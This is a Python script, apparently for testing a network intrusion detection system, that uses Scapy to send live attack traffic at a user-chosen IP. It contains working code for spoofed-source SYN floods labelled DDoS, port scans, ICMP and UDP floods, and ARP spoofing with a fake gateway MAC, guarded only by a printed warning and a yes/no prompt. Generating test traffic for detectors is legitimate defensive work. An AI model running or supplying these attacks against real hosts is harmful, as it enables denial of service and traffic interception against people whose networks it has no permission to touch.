#!/usr/bin/env python3
"""
Real network attack traffic generator using Scapy
This generates actual network packets for testing NIDS detection
"""

import time
import random
import threading
import sys
import os
from datetime import datetime
import ipaddress

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import Ether
except ImportError:
    print("Scapy not installed. Installing...")
    os.system("pip install scapy")
    from scapy.all import *

# Add the app directory to the Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'app'))

class RealAttackGenerator:
    """Generate real network attack traffic using Scapy"""
    
    def __init__(self, target_ip="192.168.1.100", interface="Wi-Fi"):
        self.target_ip = target_ip
        self.interface = interface
        self.running = False
        self.attack_threads = []
        
    def start_attack(self, attack_type, duration=30, intensity=1):
        """Start a specific type of attack"""
        if self.running:
            print(f"Attack already running. Stop current attack first.")
            return False
            
        self.running = True
        self.attack_threads = []
        
        print(f"Starting {attack_type} attack for {duration} seconds...")
        print(f"Target: {self.target_ip}")
        print(f"Interface: {self.interface}")
        print(f"Intensity: {intensity}")
        
        try:
            if attack_type == "ddos":
                self._ddos_attack(duration, intensity)
            elif attack_type == "port_scan":
                self._port_scan_attack(duration, intensity)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(duration, intensity)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(duration, intensity)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(duration, intensity)
            elif attack_type == "arp_spoof":
                self._arp_spoof_attack(duration, intensity)
            elif attack_type == "all":
                self._all_attacks(duration, intensity)
            else:
                print(f"Unknown attack type: {attack_type}")
                return False
                
        except Exception as e:
            print(f"Error during attack: {e}")
            return False
        finally:
            self.running = False
            print(f"Attack completed.")
            
        return True
    
    def _ddos_attack(self, duration, intensity):
        """Generate DDoS attack with multiple source IPs"""
        print("Generating DDoS attack...")
        start_time = time.time()
        
        def ddos_worker():
            while time.time() - start_time < duration and self.running:
                try:
                    # Generate random source IP
                    src_ip = f"192.168.1.{random.randint(100, 200)}"
                    
                    # Create TCP SYN packet
                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=random.randint(1024, 65535),
                        dport=80,
                        flags="S"
                    )
                    
                    # Send packet
                    send(packet, iface=self.interface, verbose=False)
                    time.sleep(0.01 / intensity)  # Adjust rate based on intensity
                    
                except Exception as e:
                    print(f"Error in DDoS worker: {e}")
                    break
        
        # Start multiple threads for DDoS
        for _ in range(intensity * 5):
            thread = threading.Thread(target=ddos_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        # Wait for duration
        time.sleep(duration)
    
    def _port_scan_attack(self, duration, intensity):
        """Generate port scanning attack"""
        print("Generating port scan attack...")
        start_time = time.time()
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 993, 995, 1433, 3389, 5432, 5900]
        
        while time.time() - start_time < duration and self.running:
            try:
                for port in ports_to_scan:
                    # Create SYN packet for port scan
                    packet = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=self.target_ip) / TCP(
                        sport=random.randint(1024, 65535),
                        dport=port,
                        flags="S"
                    )
                    
                    send(packet, iface=self.interface, verbose=False)
                    time.sleep(0.1 / intensity)
                
                time.sleep(1)  # Wait before next scan round
                
            except Exception as e:
                print(f"Error in port scan: {e}")
                break
    
    def _syn_flood_attack(self, duration, intensity):
        """Generate SYN flood attack"""
        print("Generating SYN flood attack...")
        start_time = time.time()
        
        def syn_flood_worker():
            while time.time() - start_time < duration and self.running:
                try:
                    # Create SYN packet
                    packet = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=self.target_ip) / TCP(
                        sport=random.randint(1024, 65535),
                        dport=80,
                        flags="S"
                    )
                    
                    send(packet, iface=self.interface, verbose=False)
                    time.sleep(0.001 / intensity)  # Very fast rate
                    
                except Exception as e:
                    print(f"Error in SYN flood worker: {e}")
                    break
        
        # Start multiple threads
        for _ in range(intensity * 3):
            thread = threading.Thread(target=syn_flood_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        time.sleep(duration)
    
    def _icmp_flood_attack(self, duration, intensity):
        """Generate ICMP flood attack"""
        print("Generating ICMP flood attack...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Create ICMP packet
                packet = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=self.target_ip) / ICMP()
                
                send(packet, iface=self.interface, verbose=False)
                time.sleep(0.01 / intensity)
                
            except Exception as e:
                print(f"Error in ICMP flood: {e}")
                break
    
    def _udp_flood_attack(self, duration, intensity):
        """Generate UDP flood attack"""
        print("Generating UDP flood attack...")
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Create UDP packet
                packet = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=self.target_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=random.randint(1, 65535)
                )
                
                send(packet, iface=self.interface, verbose=False)
                time.sleep(0.01 / intensity)
                
            except Exception as e:
                print(f"Error in UDP flood: {e}")
                break
    
    def _arp_spoof_attack(self, duration, intensity):
        """Generate ARP spoofing attack"""
        print("Generating ARP spoofing attack...")
        start_time = time.time()
        
        # Get gateway IP (simplified)
        gateway_ip = "192.168.1.1"
        
        while time.time() - start_time < duration and self.running:
            try:
                # Create ARP spoof packet
                packet = Ether() / ARP(
                    op=2,  # ARP reply
                    psrc=gateway_ip,  # Spoofed source IP
                    pdst=self.target_ip,
                    hwsrc="00:11:22:33:44:55"  # Fake MAC
                )
                
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(0.1 / intensity)
                
            except Exception as e:
                print(f"Error in ARP spoof: {e}")
                break
    
    def _all_attacks(self, duration, intensity):
        """Generate all attack types in sequence"""
        print("Generating all attack types...")
        attack_types = ["ddos", "port_scan", "syn_flood", "icmp_flood", "udp_flood"]
        duration_per_attack = duration // len(attack_types)
        
        for attack_type in attack_types:
            print(f"\n--- Starting {attack_type} attack ---")
            if attack_type == "ddos":
                self._ddos_attack(duration_per_attack, intensity)
            elif attack_type == "port_scan":
                self._port_scan_attack(duration_per_attack, intensity)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(duration_per_attack, intensity)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(duration_per_attack, intensity)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(duration_per_attack, intensity)
    
    def stop_attack(self):
        """Stop the current attack"""
        self.running = False
        print("Attack stopped.")

def main():
    """Main function to run real attack generator"""
    print("Real Network Attack Traffic Generator")
    print("=" * 50)
    print("WARNING: This generates real network traffic!")
    print("Only use on networks you own or have permission to test.")
    print("=" * 50)
    
    # Get target IP from user
    target_ip = input("Enter target IP (default: 192.168.1.100): ").strip()
    if not target_ip:
        target_ip = "192.168.1.100"
    
    # Get interface from user
    interface = input("Enter network interface (default: Wi-Fi): ").strip()
    if not interface:
        interface = "Wi-Fi"
    
    # Create attack generator
    generator = RealAttackGenerator(target_ip, interface)
    
    # Show available attack types
    print("\nAvailable attack types:")
    print("1. ddos - Distributed Denial of Service")
    print("2. port_scan - Port scanning")
    print("3. syn_flood - SYN flood attack")
    print("4. icmp_flood - ICMP flood attack")
    print("5. udp_flood - UDP flood attack")
    print("6. arp_spoof - ARP spoofing attack")
    print("7. all - All attack types in sequence")
    
    # Get attack type from user
    attack_type = input("\nEnter attack type (default: all): ").strip().lower()
    if not attack_type:
        attack_type = "all"
    
    # Get duration from user
    try:
        duration = int(input("Enter duration in seconds (default: 30): ").strip() or "30")
    except ValueError:
        duration = 30
    
    # Get intensity from user
    try:
        intensity = int(input("Enter intensity level 1-5 (default: 1): ").strip() or "1")
        intensity = max(1, min(5, intensity))  # Clamp between 1 and 5
    except ValueError:
        intensity = 1
    
    # Confirm before starting
    confirm = input(f"\nStart {attack_type} attack on {target_ip} for {duration} seconds? (y/n): ").strip().lower()
    if confirm != 'y':
        print("Attack cancelled.")
        return
    
    # Start the attack
    try:
        success = generator.start_attack(attack_type, duration, intensity)
        
        if success:
            print(f"\nAttack completed successfully!")
        
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        generator.stop_attack()
    except Exception as e:
        print(f"Error during attack: {e}")

if __name__ == "__main__":
    main()
